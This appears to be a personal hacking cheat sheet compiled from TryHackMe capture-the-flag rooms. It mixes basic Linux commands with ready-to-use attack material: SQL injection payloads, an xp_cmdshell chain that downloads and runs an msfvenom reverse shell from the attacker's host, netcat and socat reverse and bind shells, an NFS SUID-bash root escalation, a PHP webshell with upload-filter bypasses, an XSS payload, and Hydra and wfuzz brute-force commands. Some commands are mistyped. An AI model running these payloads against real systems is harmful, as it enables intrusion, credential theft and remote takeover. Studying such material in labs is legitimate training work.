# Navigate

```
&
```

allows us to execute commands in the background	`e.g cp file.txt filecopy.txt &`

```
&&
```

to make a list of commands to run
e.g. `sudo apt update && sudo apt-get install whois`

```
su user2
```

switch user to user2

```
./
```
"." denotes the current working directory

"." before a filename is how *nix denotes hidden files in its structure

```
\	
```
escape character - escapes the next character from stdin
```
file [filename]
```
prints file content to stdout
```
2>/dev/null
```
redirects stderr to Null
```
mktemp -d
```
makes directory in /tmp with random name
```
du
```
displays file space usage
```
ps
```
processes
```
kill [PID]
```
kills the proccess of that PID no#
```
Ctrl+z
```
backgrounds the current process
```
fg
```
foregrounds current process
# Add HOSTNAME

How to add hostname 
- If you are connected via VPN or AttackBox, you can add the hostname `mcgreedysecretc2.thm` by first opening the host file, depending on your host operating system.  
- Windows                       :  `C:\Windows\System32\drivers\etc\hosts`
- Ubuntu or AttackBox: `/etc/hosts`

- Open the host file and add a new line at the end of the file in the format: `10.10.196.106 mcgreedysecretc2.thm`
- Save the file and type `http://mcgreedysecretc2.thm` in the browser to access the website.

# IP Info

`ifconfig`
Unix-like operating systems, displays or configures IP settings for network interfaces.

`netstat`
Displays a variety of network information, including active connections, routing tables, and traffic statistics.

`arp`
Displays the IPv4 ARP cache.

`traceroute`
Views or manipulates the IP routing table used to find paths to network addresses

`nslookup`
Performs DNS lookups and displays the IP address of a given hostname.digA more powerful alternative to nslookup. Particularly useful for zone transfers.

`traceroute`
`tracert`
Displays the hop-by-hop path to a given host, along with the round-trip time to each hop.

# File Direction
```
ls | file -f -
```
prints list > then pipes that to file
```
which [filename]
```
displays location of file
```
grep
```
searches for patterns
- -i ignores case
- -v inverts search case (ignore everything with [pattern]
- -n prints what line number is beside each grep
- -A 2 -B 4  -- prints the 2 lines AFTER and 4 lines BEFORE

```
grep "ftp" /usr/share/nmap/scripts/script.db
```
grep a file

```
grep -E "thm|tryhackme" log.txt
```
-E	Searches using regex (regular expressions). For example, we can search for lines that contain either "thm" or "tryhackme"	

```
grep -r "helloworld" mydirectory
```

Search recursively. For example, search all of the files in a directory for this value.

```
ls -l /usr/share/nmap/scripts/*ftp*
```
ls a directory for files that contain *ftp*
```
find
```
search for files in a directory hierachy 
- -user uname
- -size n 
- -group gname 
- -name filename 
- -name * .txt 
finds all txt files
```
sort
```
sort lines of text files

```
uniq
```
displays lines that are repeated
```
strings 
```
finds string patterns in a file
```
cut -d:  -f1
```
only see one field from the password file.

For example, to just see the Unix user names, use the command 
` “$ cat /etc/passwd | cut -d: -f1.” 

```
nl access.log
```
The nl command stands for **number lines**. It renders the contents of the file in a numbered line format.

```
cut -d ' ' -f1,3,6 access.log
```
cuts into columns delimited by a space ( ' ' ) 
takes columns 1,3 & 6

----
#### The first use of the cut command retrieves the column of the domain:port, and the second one removes the port by splitting it with a colon.

~~~
ubuntu@tryhackme:~/Desktop/artefacts$ cut -d ' ' -f3 access.log | cut -d ':' -f1
sway.com
sway.com
sway.office.com
--- REDACTED FOR BREVITY ---
~~~

#### After retrieving the domains, the sort command arranges the list in alphabetical order

~~~
ubuntu@tryhackme:~/Desktop/artefacts$ cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort
account.activedirectory.windowsazure.com
account.activedirectory.windowsazure.com
account.activedirectory.windowsazure.com
--- REDACTED FOR BREVITY ---
~~~

#### Lastly, the uniq command removes all the duplicates

~~~
ubuntu@tryhackme:~/Desktop/artefacts$ cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq
account.activedirectory.windowsazure.com
activity.windows.com
admin.microsoft.com

--- REDACTED FOR BREVITY ---
~~~


----

# Zip Files

```
xxd -r
```
reverts a hexdump file
```
zcat
bzcat
```
decompresses file to stdout

```
tar
```
collects two or more files into one file using
a format that allows the files to be extracted later
>commonly compressed with gzip, bzip2 into a “tarball”.

```
tar xO
```
extracts tar files


# Cron

`crontab -l
shows cron jobs
https://crontab-generator.org/

# Ps

`top`
displays cpu jobs and pids
`systemctl list-unit-files`
lists all services

# ----Handy Nix FILES----

>var/log

>.bashrc

list of users
>/etc/passwd`



logs access information, ip of logins etc

>/usr/share/seclists

>/usr/share/wordlists

>The ~/.ssh folder is the default place to store these keys for OpenSSH

>/etc/hosts

>/etc/passwd

>password hashes are stored in /etc/shadow

>/var/log

shows logs

| Category | Description | File | Example |
|---|---|---|---|
|Authentication|This log file contains all authentication (log in). This is usually attempted either remotely or on the system itself (i.e., accessing another user after logging in).|	auth.log|Failed password for root from 192.168.1.35 port 22 ssh2.
|Package Management |This log file contains all events related to package management on the system. When installing a new software (a package), this is logged in this file. This is useful for debugging or reverting changes in case this installation causes unintended behaviour on the system.|dpkg.log|2022-06-03 21:45:59 installed neofetch
|Syslog	|This log file contains all events related to things happening in the system's background. For example, crontabs executing, services starting and stopping, or other automatic behaviours such as log rotation. This file can help debug problems.|syslog|2022-06-03 13:33:7 Finished Daily apt download activities..|
|Kernel|This log file contains all events related to kernel events on the system. For example, changes to the kernel, or output from devices such as networking equipment or physical devices such as USB devices.|	kern.log|2022-06-03 10:10:01 Firewalling registered|

# Common Hash Prefix

>$1$	    md5crypt, used in Cisco stuff and older Linux/Unix systems
>$2$, $2a$, $2b$, $2x$, $2y$        Bcrypt (Popular for web applications)
>$6$    	sha512crypt (Default for most Linux/Unix systems)

# GPG

```
gpg --import [keyfile]
```

imports secret key

```
gpg --decrypt [FILE_TO_DECRYPT]
```

---
# Connect
```
telnet [ip_address] [port] 
```
```
nc [nameofhost] [port]
```
connects to host

```
openssl s_client -connect [host]:[port] -ign_eof
```
connects to port using ssl encryption

``` 
nc -lvp 4444
```
sets a listener to port 4444

## SSH

```
ssh raz@10.10.169.1
```
~~~
ssh -i [rsa_key_filename] [user]@[ip_address]
~~~
~~~
ssh -i keyNameGoesHere user@host
~~~
how you specify a key for the standard Linux OpenSSH client.
>The ~/.ssh folder is the default place to store these keys for OpenSSH

**ensure you use `chmod 600 rsa_key_filename`**

```
ssh-copy-id -i ~/.ssh/id_rsa.pub YOUR_USER_NAME@IP_ADDRESS_OF_THE_SERVER
```
Your public key should be copied at the appropriate folder on the remote server automatically.

```
mysql -h [IP] -u [username] -p
```
Connect to MYSQL server

## Remote Desktop - RDP

```
rdesktop 10.10.180.211 -u THM\Administrator -p Password123
```

remotes into IP

**Then connecting via RDP, use THM\Administrator as the username to specify you want to log in using the user Administrator on the THM domain.**


# NFS Share Reverse Shell

1. step one

    ```
     showmount -e [IP]
    ```
    shows visible NFS shares on that IP 

2. Step Two

    ```
    sudo mount -t nfs IP:share /tmp/mount/ -nolock
    ```
    mounts the share from "IP:share" to the directory "/tmp/mount"

3. Step Three
    Download Bash executable
    ```
    get https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash -P ~/Downloads
    ```
4. Step Four

    ```
    cp ~/Downloads/bash ~/share
    ```
    Copy it to the NFS mount point

5. Step Five

    Change its permissions
    ```
    sudo chmod +s bash
    sudo chmod +x bash
    file should have "-rwsr-sr-x" as permissions
    ```
6. Step Six
    ssh into the machine that now holds the bash executable
    run the executable using
	```
    ./bash -p
    ```
>You should now have a shell as "root"

# Enumeration

## Scan

> ping [domain OR ip address]

displays if there are open ports

>dig

manually query recursive DNS servers
displays TTL

>whois

Query who a domain name is registered to

>traceroute

see every intermediate step between your computer 
and the resource that you requested

nmap [host / ip]

- -p 80 --scans port 80
- -p- scans all ports
- -A Enable OS detection, version detection, script scanning, and traceroute
- -v verbose
- -F: Fast mode
- --top-ports [number] 		Scan [number] most common ports
- -sL: List Scan - simply list targets to scan
- -sn: Ping Scan - disable port scan
- sS    stealth scan/TCP SYN Scan

`nmap $ip -p- -A -v -top-ports 100`

### WordPress blogs~
```
wpscan
```
scans blogs such as wordpress, then compares them to a locally stored database of attack vectors
```
wpscan --update 		
```
updates local database of CSS themes, plugins and CVEs
```
wpscan --url http://cmnatics.playground/ --enumerate t --enumerate p --enumerate u 
```
enumerates wordpress themes, plugins or users
```
wpscan –-url http://cmnatics.playground –-passwords rockyou.txt –-usernames cmnatic
```
uses bruteforce wordlist on the users you have found
```
--plugins-detection aggressive, --users-detection aggresive --themes-detection aggressive
```
argument that changes scan footprint

### Web Directories
```
gobuster dir
OR
dirbuster
```
>gobuster dir -u 10.10.72.231 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
- -t	--threads
Number of concurrent threads (default 10) - change to 64 to go faster
- -o	--output
Output file to write results to
- -x    --extensions
outputs file extensions in folders e.g. -x html, js, txt, conf, php ***THIS ONE IS IMPORTANT***
- -k	--no-tls-validation
Skip TLS certificate verification

>It's important to specify HTTPS:// or HTTP:// when using URLs

An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.

### Subdomains
```
gobuster dns
```
>gobuster dns -d mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
- -c	--show-cname
Show CNAME Records (cannot be used with '-i' option)
- -i	--show-ips
Show IP Addresses

#### Common Site SubDomains

- `sitemap`
- `mail` 
- `login`
- `register`
- `admin`
- `console`
- 
### Vitual Hosts

Virtual hosts are different websites on the same machine. 
In some instances, they can appear to look like sub-domains, but don't be deceived! 
Virtual Hosts are IP based and are running on the same server.

```
gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```
## SMB

### enum4linux

>enum4linux -a 10.10.69.691

```
smbclient //10.10.10.2/secret -U suit -p 445
```

- -u    username
- -p    port number

Access the 'Share' using `smbclient //IP/SHARE`

you can type `smb://10.10.69.232` into the file explorer



## Vulnerable Hosts

### nikto

`nikto -h 10.10.10.10 -p 80,8000,8080
enumerates on ports 80,8000 etc, 
`nmap -p80 172.16.0.0/24 -oG - | nikto -h -
takes the results of the nmap scan, formats them to a nikto friendly format (-oG), then pipes to nikto
`nikto --list plugins
lists useful plugins that are apropriate for the target
`nikto -h 10.10.10.1 -Plugin apacheuser
uses "apacheuser" plugin
`nikto -h 10.10.10.1 -Display 1,2,E
can display 1,2 or E mode (redirects, cookies and errors)
`nikto -h 10.10.10.1 -Tuning (0-9)
Tuning options to find certain vulnerability types
`nikto -h 10.10.10.1 -o NiktoReport.html
can output to certain filetypes like html or txt

---
# OSINT

- `inurl:` Searches for a specified text in all indexed URLs. For example, `inurl:hacking` will fetch all URLs containing the word "hacking".
- `filetype:` Searches for specified file extensions. For example, `filetype:pdf "hacking"` will bring all pdf files containing the word "hacking". 
- `site:` Searches all the indexed URLs for the specified domain. For example, `site:tryhackme.com` will bring all the indexed URLs from  tryhackme.com.
- `cache:` Get the latest cached version by the Google search engine. For example, `cache:tryhackme.com.`

```
whois santagift.shop
```


uses database to display public domain info

>https://who.is/

robots.txt 

provides sitemap info

> Searching GitHub Repos

Search various terms on GitHub to find something useful

|Tool | Purpose |
|---|---|
|VirusTotal|A service that provides a cloud-based detection toolset and sandbox environment.|
|InQuest|A service provides network and file analysis by using threat analytics.|
|IPinfo.io|A service that provides detailed information about an IP address by focusing on geolocation data and service provider.|
|Talos Reputation|An IP reputation check service is provided by Cisco Talos.|
|Urlscan.io|A service that analyses websites by simulating regular user behaviour.|
|Browserling|A browser sandbox is used to test suspicious/malicious links.|
|Wannabrowser|A browser sandbox is used to test suspicious/malicious links.|


```
sudo go run mosint vivian@gmail.com
```
>need to cd into mosint directory first

# Email Analysis

| Questions to ask | Evaluation |
|---|---|
|Do the "From", "To", and "CC" fields contain valid addresses?|Having invalid addresses is a red flag.|
|Are the "From" and "To" fields the same?|Having the same sender and recipient is a red flag.|
|Are the "From" and "Return-Path" fields the same?|Having different values in these sections is a red flag.|
|Was the email sent from the correct server?|Email should have come from the official mail servers of the sender.|
|Does the "Message-ID" field exist, and is it valid?|Empty and malformed values are red flags.|
|Do the hyperlinks redirect to suspicious/abnormal sites?|Suspicious links and redirections are red flags.|
|Do the attachments consist of or contain malware?|Suspicious attachments are a red flag.File hashes marked as suspicious/malicious by sandboxes are a red flag.|

>https://emailrep.io/
email reputation analyser

>https://eml-analyzer.herokuapp.com/
email analyser that uses SpamAssasin, VirusTotal & others


---

# Priveledge Escalation

```
sudo -l
```

>shows current users permissions

first ssh into ip THEN
```
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

```
etc/ssh/ssshd_config
```
contains ssh configurations such as #PasswordAurhentication




---
#  SQL Injection

add a space character before registering a new account to gain the same read/write permissions as an account with the same name
```
'admin' --> is a registered account username
you create the username ' admin' to gain the same rights 
```
### In Band Authentication bypass
~~~
' OR 1=1;--
or
email@email.com' --  
~~~

`bob' AND 1=1--` would update Bob's record, while `bob' AND 1=2--` would not. This demonstrates the SQL injection vulnerability without putting the entire table's records at risk.
### Boolean Return
```SQL
' UNION SELECT 1;--
' UNION SELECT 1,2;--
' UNION SELECT 1,2,3;--
```
enumerates the correct number of columns in the query table

```
' UNION SELECT 1,2,3 where database() like '%';--
```
enumerates database name by scrolling through the wildcard '%' values

```
' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = '[[DATABASE NAME]]' and table_name like 'a%';--
```
enumerates table name by scrolling through the wildcard '%' values

```
' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='[[DATABASE_NAME]]' and TABLE_NAME='[[TABLE_NAME]]' and COLUMN_NAME like 'a%';--
```
enumerates column name by scrolling through the wildcard '%' values

```
' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='[[DATABASE_NAME]]' and TABLE_NAME='[[TABLE_NAME]]' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'	
```
Again you'll need to cycle through letters, numbers and characters until you find a match. 
>As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name,

```
' UNION SELECT 1,2,3 from [[TABLE_NAME]] where [[COLUMN_NAME]] like 'a%
```
cycles through valid column name entries
```
' UNION SELECT 1,2,3 from [[TABLE_NAME]] where [[COLUMN_NAME]]='[[VALID_ENTRY]]' and [[OTHER_COLUMN_NAME]] like 'a%
```
cycles through row entry data

### Time Based Return

```
' UNION SELECT SLEEP(5);--
```
Same as Boolean Return except when the SLEEP(5) function is hit - the return is equal to TRUE
```
' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```
will sleep if the database name starts with the letter "u"

## xp_cmdshell

**xp_cmdshell** is a system-extended stored procedure in **Microsoft SQL Server** that enables the execution of operating system commands and programs from within SQL Server.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

~~~
http://10.10.39.50/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
~~~

Generate Payload WIndows MSSQL
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
```
Start a Python HTTP Server
```shell-session
python3 -m http.server 8000
```

~~~
http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
~~~
The above SQL statement will call **certutil** to download the **reverse.exe** file from our Python HTTP server and save it to the Windows temp directory for later use.

Start a netcat Listener
```shell-session
nc -lnvp 4444
```
Now, we can run one final stacked query to execute the **reverse.exe** file we previously saved in the `C:\Windows\Temp` directory:
```
http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --```
```

## XSS 
```HTML
	<iframe src="javascript:alert(`xss`)"> 
```
	

## DOM XSS 
uses the HTML environment to execute malicious javascript. 
This type of attack commonly uses the script \script HTML tag

## Persistent (Server-side) XSS

javascript that is run when the server loads the page containing it.

>These can occur when the server does not sanitise the user data when it is uploaded to a page. 

>These are commonly found on blog posts. 

## Reflected (Client-side) XSS

javascript that is run on the client-side end of the web application. 

>These are most commonly found when the server doesn't sanitise search data. 

---
# BruteForce

## CeWL

```
cewl http://10.10.198.183
```
Creates a wordlist based on site keywords

1. **Specify spidering depth:** The `-d` option allows you to set how deep CeWL should spider. For example, to spider two links deep: `cewl http://10.10.198.183 -d 2 -w output1.txt`
2. **Set minimum and maximum word length:** Use the `-m` and `-x` options respectively. For instance, to get words between 5 and 10 characters: `cewl http://10.10.198.183 -m 5 -x 10 -w output2.txt`
3. **Handle authentication:** If the target site is behind a login, you can use the `-a` flag for form-based authentication.
4. **Custom extensions:** The `--with-numbers` option will append numbers to words, and using `--extension` allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
5. **Follow external links:** By default, CeWL doesn't spider external sites, but using the `--offsite` option allows you to do so.

## Crunch

``crunch 3 3 0123456789ABCDEF -o 3digits.txt``
Generates a list of possible passcodes

The command above specifies the following:

- `3` the first number is the minimum length of the generated password
- `3` the second number is the maximum length of the generated password
- `0123456789ABCDEF` is the character set to use to generate the passwords
- `-o 3digits.txt` saves the output to the `3digits.txt` file

## WFuzz

Wfuzz is a tool designed for brute-forcing web applications. It can be used to find resources not linked directories, servlets, scripts, etc, brute-force GET and POST parameters for checking different kinds of injections (SQL, XSS, LDAP), brute-force forms parameters (user/password) and fuzzing.

```shell-session
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.198.183/login.php -d "username=FUZZ&password=FUZ2Z"
```

- `-z file,usernames.txt` loads the usernames list.
- `-z file,passwords.txt` uses the password list generated by CeWL.
- `--hs "Please enter the correct credentials"` hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
- `-u` specifies the target URL.
- `-d "username=FUZZ&password=FUZ2Z"` provides the POST data format where **FUZZ** will be replaced by usernames and **FUZ2Z** by passwords.

## Hydra

`hydra -l '' -P 3digits.txt -f -v 10.10.123.72 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`

The command above will try one password after another in the `3digits.txt` file. It specifies the following:

- `-l ''` indicates that the login name is blank as the security lock only requires a password
- `-P 3digits.txt` specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `10.10.123.72` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php` is the page where the PIN code is submitted
    - `pin=^PASS^` will replace `^PASS^` with values from the password list
    - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
- `-s 8000` indicates the port number on the target

```
~hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.221.163 ssh
```
- -t 	--uses 16 parallel connections
- -P	--path to wordlist
- uses ssh

```
sudo hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.134.126 http-post-form "/login/login.php:username=R1ckRul3s&password=^PASS^&sub=Login:Invalid username or password."
```
- http-post-form    --uses post from the subdirectory
- username=R1ckRul3s&password=^PASS^&sub=Login      --found in the network tab under "send and edit"
- Invalid username or password.     -- Invalid creds state, found by entering the incorrect credentials 

---
## johntheRipper

### you can also use https://crackstation.net/ to crack hashes

wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py

hash identifier
```
john hash.txt
```
uses johntheripper to crack hashed passwords
```
john --wordlist=[path to wordlist] [path to file]
```
--wordlist=~/Tryhackme/wordlists/rockyou.txt hash.txt
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
```

>if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with `raw-` to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john `--list=formats` and either check manually, or grep for your hash type using something like `john --list=formats | grep -iF "md5"`

---

```
unshadow [path to passwd] [path to shadow]
```

>[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine

>[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine

John can be very particular about the formats it needs data in to be able to work with it, for this reason- in order to crack /etc/shadow passwords, you must combine it with the /etc/passwd file in order for John to understand the data it's being given. To do this, we use a tool built into the John suite of tools called unshadow 

---
```
zip2john [options] [zip file] > [output file]
```
convert the zip file into a hash format that John is able to understand

```
rar2john [options] [rar file] > [output file]
```
convert the rar file into a hash format that John is able to understand

```
ssh2john [options] [rsa file] > [output file]
```
convert the ssh file into a hash format that John is able to understand

```
john --single --format=[format] [path to file] 
```
--single mode is used for username mangling
>If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt from: `1efee03cdcb96d90ad48ccc7b8666033` To `mike:1efee03cdcb96d90ad48ccc7b8666033`


```
Intruder tab on Burpsuite
```

---
# Reverse Shells

Payloads all the Things
>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Reverse Shell Cheatsheet
>https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Reverse Shell Generator
>https://www.revshells.com/

---

## Reverse Shell example

on the attacking machine
```
sudo nc -lvnp 443
```
>starts a listener

on the target 
```
nc <LOCAL-IP> <PORT> -e /bin/bash
```


---

## Bind Shell example

On the attacking machine
```n
c 10.10.36.67 <port>
```

On the target
```
nc -lvnp <port> -e "cmd.sh"
```
>--cmd.exe would contain code that starts a listener attached to a shell directly on the target

---

## Stabilisation

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
>have to explicitly state python,python2,python3

```
export TERM=xterm
```
>this will give us access to term commands such as clear

```
^Z 
```
>(press ctrl+Z to background the shell)
```
stty raw -echo; fg
```
>foregrounds the shell gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes

---

## rlwrap listener & stabilization
```
rlwrap nc -lvnp <port>
```
>starts listener on host

background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 

---

## soCat stabilization

use a webserver on the attacking machine inside the directory containing your socat binary 
```
~sudo python3 -m http.server 80
```
then, on the target machine, using the netcat shell to download the file.
```
get <LOCAL-IP>/socat -O /tmp/socat
```
```
~Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

---

## Change terminal tty size~

First, open another terminal and run 
```
stty -a
```
This will give you a large stream of output. Note down the values for "rows" and columns

Next, in your reverse/bind shell, type in:
```
~stty rows <number>
~stty cols <number>	
```
This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

# socat

### Reverse Shell

```
socat TCP-L:<port> -
```
basic reverse shell listener in socat

>will work on Linux or Windows

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
windows reverse shell from target

```console
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
Linux Reverse shell from target

---

## Bind Shell

```console
socat TCP-L:<PORT> EXEC:"bash -li"
```
>target command

```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
``` 
>listener for windows

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
>used to connect from attacking machine

---

## Stable tty reverse shell

>will only work on a Linux target

```
socat TCP-L:<port> FILE:`tty`,raw,echo=0 
```

>listener

```
Gosh IDK man 
```
As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z

>https://tryhackme.com/room/introtoshells

---

# PHP RCE from a File Upload

```
<?php
    echo system($_GET["cmd"]);
?>
```

- add this to a web directory with a filename like 'webshell.php'
- then navigate to the file you uploaded and add to the url your console cmd
  
>e.g. `http://shell.uploadvulns.thm/resources/webshell.php?cmd=id;whoami;ls`

then from here we can upload an RCE

>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

---

### Client-side filtering and server-side filtering

- Extension Validation
- File Type Filtering
  - MIME validation
  - Magic Number validation
- File Length Filtering
- File Name Filtering
- File Content Filtering

---

# Bypass file filtering

## Send the file directly to the upload point

Why use the webpage with the filter, when you can send the file directly using a tool like curl?

```
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```

>To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

# Bypassing Server-Side Filtering

>first step, google alternate extensions e.g. https://en.wikipedia.org/wiki/PHP

The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.

append a file type e.g. `webshell.jpg.php`
collect a burpsuite capture to delete the filter either *before* the page loads *or before* the file is uploaded

# Bypassing using magic numbers

- use nano to add "A" the correct number of times to the start of the file
- use hexeditor to change those characters to magic numbers associated to the target file type

---

# RSA

The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

“p” and “q” are large prime numbers, “n” is the product of p and q.

The public key is n and e, the private key is n and d.

“m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).

# REGEX

- [0-9] - Will include numbers 0-9

- [0] - Will include only the number 0

- [A-z] - Will include both upper and lowercase

- [A-Z] - Will include only uppercase letters

- [a-z] - Will include only lowercase letters

- [a] - Will include only a

- [!£$%@] - Will include the symbols !£$%@


# Exit VIM

To save a file and exit Vim, do the following:

- Switch to command mode by pressing the Esc key.
- Press : (colon) to open the prompt bar in the bottom left corner of the window.
- Type x after the colon and hit Enter. This will save the changes and exit.

---
